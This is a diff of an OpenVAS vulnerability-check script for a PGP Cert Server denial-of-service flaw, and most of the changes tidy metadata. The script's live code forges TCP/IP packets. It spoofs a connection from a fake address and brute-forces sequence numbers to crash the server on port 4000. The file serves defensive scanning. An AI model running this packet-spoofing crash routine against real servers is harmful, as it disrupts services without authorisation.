@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: PGPCert_DoS.nasl 6040 2017-04-27 09:02:38Z teissa $
+# $Id: PGPCert_DoS.nasl 9324 2018-04-05 09:28:03Z cfischer $
 #
 # NAI PGP Cert Server DoS
 #
@@ -27,9 +27,9 @@
 
 if(description)
 {
-  script_id(10442);
-  script_version("$Revision: 6040 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-27 11:02:38 +0200 (Thu, 27 Apr 2017) $");
+  script_oid("1.3.6.1.4.1.25623.1.0.10442");
+  script_version("$Revision: 9324 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-04-05 11:28:03 +0200 (Thu, 05 Apr 2018) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_bugtraq_id(1343);
   script_tag(name:"cvss_base", value:"5.0");
@@ -42,22 +42,19 @@ if(description)
   script_dependencies("secpod_open_tcp_ports.nasl");
   script_mandatory_keys("TCP/PORTS");
   script_require_ports(4000);
+  script_exclude_keys("keys/TARGET_IS_IPV6");
 
-  tag_solution = "Upgrade to the latest version.";
+  script_tag(name:"solution", value:"Upgrade to the latest version.");
 
-  tag_summary = "It was possible to make the remote PGP Cert Server
+  script_tag(name:"summary", value:"It was possible to make the remote PGP Cert Server
   crash by spoofing a TCP connection that seems to
-  come from an unresolvable IP address.";
+  come from an unresolvable IP address.");
 
-  tag_impact = "An attacker may use this flaw to prevent your PGP 
-  certificate server from working properly.";
-
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
-  script_tag(name:"impact", value:tag_impact);
+  script_tag(name:"impact", value:"An attacker may use this flaw to prevent your PGP
+  certificate server from working properly.");
 
   script_tag(name:"qod_type", value:"remote_vul");
-  script_exclude_keys("keys/TARGET_IS_IPV6");
+  script_tag(name:"solution_type", value:"VendorFix");
 
   exit(0);
 }
@@ -65,16 +62,14 @@ if(description)
 include("misc_func.inc");
 
 if(TARGET_IS_IPV6())exit(0);
-if(!get_port_state(4000))exit(0);
 
-soc = open_sock_tcp(4000);
+port1 = 4000;
+if(!get_port_state(port1))exit(0);
+soc = open_sock_tcp(port1);
 if(!soc)exit(0);
 close(soc);
 
-
 #get a sequence number from the target
-
-
 dstaddr=get_host_ip();
 srcaddr=this_host();
 IPH = 20;
@@ -89,7 +84,6 @@ ip = forge_ip_packet(   ip_v : 4,
                         ip_ttl : 255,
                         ip_off : 0,
                         ip_src : srcaddr);
-
 port = get_host_open_tcp_port();
 
 tcpip = forge_tcp_packet(    ip       : ip,
@@ -102,18 +96,13 @@ tcpip = forge_tcp_packet(    ip       : ip,
                              th_off   : 5,
                              th_win   : 512,
                              th_urp   : 0);
-
 filter = string("tcp and (src addr ", dstaddr, " and dst addr ", srcaddr, " dst port ", port, ")");
 result = send_packet(tcpip, pcap_active:TRUE, pcap_filter:filter);
 if (result)  {
   tcp_seq = get_tcp_element(tcp:result, element:"th_seq");
 }
 
-
-
-
 #now spoof Funky IP with guessed sequence numbers
-
 
 #packet 1.....SPOOF SYN
 IPH = 20;
@@ -145,10 +134,7 @@ tcpip = forge_tcp_packet(    ip       : ip2,
 
 result = send_packet(tcpip,pcap_active:FALSE);
 
-
 # SPOOF SYN/ACK (brute guess next sequence number)
-
-
 for (j=tcp_seq+1; j < tcp_seq + 25; j=j+1) {
   tcpip = forge_tcp_packet(    ip       : ip2,
                                th_sport : 5555,
@@ -166,8 +152,10 @@ for (j=tcp_seq+1; j < tcp_seq + 25; j=j+1) {
 }
 
 sleep(15);
-soc = open_sock_tcp(4000);
-if(!soc)
-{
- security_message(4000);
+soc = open_sock_tcp(port1);
+if(!soc){
+  security_message(port:port1);
+  exit(0);
 }
+
+exit(99);
